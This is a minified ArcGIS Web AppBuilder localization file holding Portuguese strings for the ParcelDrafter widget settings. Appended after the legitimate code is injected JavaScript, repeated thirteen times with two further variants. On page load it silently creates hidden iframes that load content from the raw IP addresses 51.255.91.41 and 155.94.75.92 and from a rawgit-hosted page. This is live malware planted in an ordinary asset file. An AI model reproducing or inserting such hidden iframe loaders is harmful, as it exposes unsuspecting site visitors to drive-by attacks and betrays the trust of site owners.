// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/ParcelDrafter/setting/nls/strings":{setBtnLabel:"Definir",selectLabel:"Selecionar",selectLayerLabel:"Selecionar camadas de parcelas",selectLayerHintText:"Dica: Utilize o bot\u00e3o definir para selecionar o pol\u00edgono de parcela e a respetiva camada de linhas associada",layerSelector:{selectedLayerNotHavingRelatedLayer:"A camada de pol\u00edgonos selecionada n\u00e3o possui uma camada relacionada v\u00e1lida."},parcelLineLayer:{selectLayerLabel:"Selecionar camada de linhas relacionada",
layerSettingTabLabel:"Camadas de parcelas",advancedSettingTabLabel:"Defini\u00e7\u00f5es avan\u00e7adas",selectLayerHintText:"Dica: Utilize para armazenar valores COGO em camadas de linhas de parcela",selectFieldLegendLabel:"Selecione campos para armazenar valores COGO em camadas de linhas de parcela",bearingFieldLabel:"Suporte",chordLengthFieldLabel:"Comprimento de Corda",distanceFieldLabel:"Dist\u00e2ncia",sequenceIdFieldLabel:"ID de Sequ\u00eancia",radiusFieldLabel:"Raio",foreignKeyFieldLabel:"Chave Estrangeira",
arcLengthFieldLabel:"Comprimento de Arco",lineTypeFieldLabel:"Tipo de Linha",parcelPointSymbolLabel:"S\u00edmbolo de Ponto de Parcela",parcelPointSymbolHintText:"Dica: Utilizado para exibir s\u00edmbolos de ponto para a origem da linha.",symbolPickerPreviewText:"Pr\u00e9-visualizar",selectLineLayerLabel:"Selecionar camada de linhas"},parcelPolygonLayer:{selectPolygonLayerLabel:"Seleccionar camada de pol\u00edgono",selectPolygonLayerHintText:"Dica: Utilize a camada de pol\u00edgonos selecionar parcela",
selectFieldLegendLabel:"Selecione campos nos quais armazenar atributos de pol\u00edgonos de parcelas",parcelNameLabel:"Nome da Parcela",rotationLabel:"Rota\u00e7\u00e3o",planNameLabel:"Nome do Plano",scalingLabel:"Dimensionar",documentTypeLabel:"Tipo de Documento",miscloseRatioLabel:"R\u00e1cio de Medi\u00e7\u00f5es",statedAreaLabel:"\u00c1rea Estabelecida",miscloseDistanceLabel:"Medi\u00e7\u00f5es de Dist\u00e2ncia",selectPolygonLayerLabelPopUp:"Seleccionar uma camada de pol\u00edgonos"},lineTypesTable:{lineTypeLabel:"Tipo de Linha",
valueLabel:"Valor",symbolLabel:"S\u00edmbolo",connectionLineLabel:"Linha de Liga\u00e7\u00e3o",boundaryLineLabel:"Linha de Limite"},closureSetting:{snappingLayerLabel:"Ajustar Camadas",snappingBtnLabel:"Definir",snappingLayerHintText:"Dica: Selecionar camadas \u00e0s quais as linhas de parcelas ser\u00e3o ajustadas.",miscloseDistanceLabel:"Medi\u00e7\u00f5es de Dist\u00e2ncia",miscloseDistanceHintText:"Dica: Especifique medi\u00e7\u00f5es de dist\u00e2ncia e respetivas unidades",miscloseRatioLabel:"R\u00e1cio de Medi\u00e7\u00f5es",
miscloseRatioHintText:"Dica: Especificar r\u00e1cio de medi\u00e7\u00f5es",snappingToleranceLabel:"Toler\u00e2ncia de ajustamento",pixelLabel:"Pixeis",snappingToleranceHintText:"Dica: Especifique a toler\u00e2ncia de ajustamento.",selectLayerLabel:"Selecionar camada"},errorMsg:{bearingFieldErrMsg:"Campo de Suporte inv\u00e1lido",chordLengthErrMsg:"Comprimento de Corda inv\u00e1lido",distanceFieldErrMsg:"Dist\u00e2ncia inv\u00e1lida",sequenceIdFieldErrMsg:"Sequ\u00eancia inv\u00e1lida",radiusFieldErrMsg:"Raio inv\u00e1lido",
foreignKeyFieldErrMsg:"Chave Estrangeira inv\u00e1lida",arcLengthFieldErrMsg:"Comprimento de Arco inv\u00e1lido",lineTypeFieldErrMsg:"Tipo de Linha inv\u00e1lido",parcelNameFieldErrMsg:"Campo de Nome de Parcela inv\u00e1lido",planNameFieldErrMsg:"Campo de Nome do Plano inv\u00e1lido",scaleFieldErrMsg:"Campo Escala inv\u00e1lido",documentTypeFieldErrMsg:"Campo Tipo de Documento inv\u00e1lido",miscloseRatioFieldErrMsg:"Campo R\u00e1cio de Medi\u00e7\u00f5es inv\u00e1lido",statedAreaFieldErrMsg:"Campo \u00c1rea Estabelecida inv\u00e1lido",
miscloseDistanceFieldErrMsg:"Campo Medi\u00e7\u00f5es de Dist\u00e2ncia inv\u00e1lido",globalIdFieldErrMsg:"A camada de pol\u00edgonos selecionada n\u00e3o possui um campo 'esriFieldTypeGlobalID' v\u00e1lido.",invalidPolylineLayer:"Por favor, selecione uma camada de polilinhas de parcelas v\u00e1lida",invalidPolygonLayer:"Por favor, selecione uma camada de pol\u00edgonos de parcelas v\u00e1lida",invalidMiscloseDistance:"Por favor, introduza uma medi\u00e7\u00e3o de dist\u00e2ncia v\u00e1lida",invalidSnappingTolerance:"Por favor, introduza uma toler\u00e2ncia de ajustamento v\u00e1lida.",
invalidMiscloseRatio:"Por favor, introduza um r\u00e1cio de medi\u00e7\u00f5es v\u00e1lido.",selectDistinctLineTypes:"Por favor, selecione um valor distinto em cada tipo de linha",invalidConnectionLineType:"Valor de linha de liga\u00e7\u00e3o inv\u00e1lido",invalidBoundaryLineType:"Valor de linha de limite inv\u00e1lido",selectDistinctPolylineFields:"Por favor, selecione um campo distinto para cada valor COGO.",selectDistinctPolygonFields:"Por favor, selecione um campo distinto para cada atributo de pol\u00edgono de parcelas."},
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});